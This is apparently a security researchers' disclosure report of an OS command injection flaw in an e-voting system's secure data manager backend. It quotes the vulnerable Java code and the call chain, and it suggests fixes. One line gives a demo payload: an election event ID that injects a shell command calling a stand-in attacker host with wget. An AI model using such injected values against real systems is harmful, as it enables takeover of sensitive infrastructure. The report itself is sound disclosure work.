# OS command injection
---

| Action  | Date  |
|---|---|
| Vulnerability reported  | 08.02.2019   |
| Report closed  | 18.02.2019  |
| Vulnerability fixed  | Next Version (Date NA)  |

Abstract: Given an attacker has internal access to the system they would be able to execute arbitrary OS commands by registering voting events.

The following file is vulnerable for command injection:
```java
/evoting-solution/source-code/online-voting-secure-data-manager/secure-data-manager-backend/secure-data-manager-integration/src/main/java/com/scytl/products/ov/sdm/plugin/SequentialExecutorImpl.java
```

Containing the following function:
```java
    public void execute(List<String> commands, Parameters parameters, ExecutionListener listener) {

        for(String command : commands) {
            String mockCommand = command;
            try {
                //Replace the parameters and execute the command
                String[] partialCommands = replaceParameters(command, parameters);
                String fullCommand = partialCommands[0];
                mockCommand = partialCommands[1];
                Process proc = Runtime.getRuntime().exec(fullCommand);
```

If an attacker is able to manipulate fullCommand, he can overtake the secure-data-manager-backend system.


The replaceParameters function isn't escaping the command: 

```java
    private String[] replaceParameters(String command, Parameters parameters) {
        String partialCommand = command;
        String replacedCommand = command;
        
        for (KeyParameter key : KeyParameter.values()) {
            if(replacedCommand.contains(key.toString())) {
                String value = parameters.getParam(key.name());
                if(value == null || value.isEmpty()){
                    throw new IllegalArgumentException("Parameter #" + key.name() + "# is null or empty");
                } else {
                	replacedCommand = replacedCommand.replaceAll("#" + key + "#", value);
                    if (key == KeyParameter.PRIVATE_KEY) {
                        partialCommand = partialCommand.replaceAll("#" + key + "#", "PRIVATE_KEY");
                    } else {
                        partialCommand = partialCommand.replaceAll("#" + key + "#", value);
                    }
                }
```

The execute function is called from the following file which is used by the ws-rest backend component:
```java
evoting-solution/source-code/online-voting-secure-data-manager/secure-data-manager-backend/sdm-ws-rest/src/main/java/com/scytl/products/ov/sdm/ui/ws/rs/application/OperationsResource.java
```

Here is the vulnerable api declaration:
```java
    @RequestMapping(value = "/generate-ea-structure/{electionEventId}", method = RequestMethod.POST)
    @ApiOperation(value = "Export operation service", notes = "", response = Void.class)
    @ApiResponses(value = {@ApiResponse(code = 404, message = "Not Found"),
            @ApiResponse(code = 403, message = "Forbidden"),
            @ApiResponse(code = 500, message = "Internal Server Error") })
    public ResponseEntity<OperationResult> extendedAuthenticationMappingDataOperation(
            @ApiParam(value = "String", required = true) @PathVariable String electionEventId,
            @RequestBody final OperationsData request) {
        Parameters parameters = buildParameters(electionEventId, request.getPrivateKeyInBase64(), null);
        return executeOperationForPhase(parameters, PhaseName.PREPARE_VC_GENERATION, true, null, null);
    }
```

The important part is that {electionEventId} is declared as a string and we can provide an arbitrary value to it.

The api calls the sequentialExecutor class:
```java
private ResponseEntity<OperationResult> executeOperationForPhase(Parameters parameters, PhaseName phaseName,
                                                                     boolean failOnEmptyCommandsForPhase, SdmSecureLogEvent secureLogEvent, String electionEventId) {
        try {
            List<String> commandsForPhase = getCommands(phaseName);

            if (failOnEmptyCommandsForPhase && commandsForPhase.isEmpty()) {
                logSecure(secureLogEvent, electionEventId,
                    "The request can not be performed for 4005, Missing commands for phase");

                return handleException(OperationsOutputCode.MISSING_COMMANDS_FOR_PHASE);
            }
            ExecutionListenerImpl listener = new ExecutionListenerImpl();
            sequentialExecutor.execute(commandsForPhase, parameters, listener);
```

The sequentialExecutor class afterwards calls the vulnerable execute function.

Exploit chain:
[OperationsResource]->[executeOperationForPhase]->[SequentialExecutorImpl.execute]

Since there was no running instance of the affected components we weren't able to provide a PoC. 
Given we would have access to it a demo exploit would look something like this:

- Register a voting event with a electionEventId named "$({wget,http://www.attacker.org/})"


To fix the vulnerability one could allow only numeric values as an electionEventId.
Another way would be to validate the electionEventId before passing it to the Runtime.exec() function.
Also one could use a string array for the getRuntime().exec() function to ensure only parameters get passed. 


| Researchers |
| --- |
| Jannis Kirschner | 
| Anthony Schneiter | 


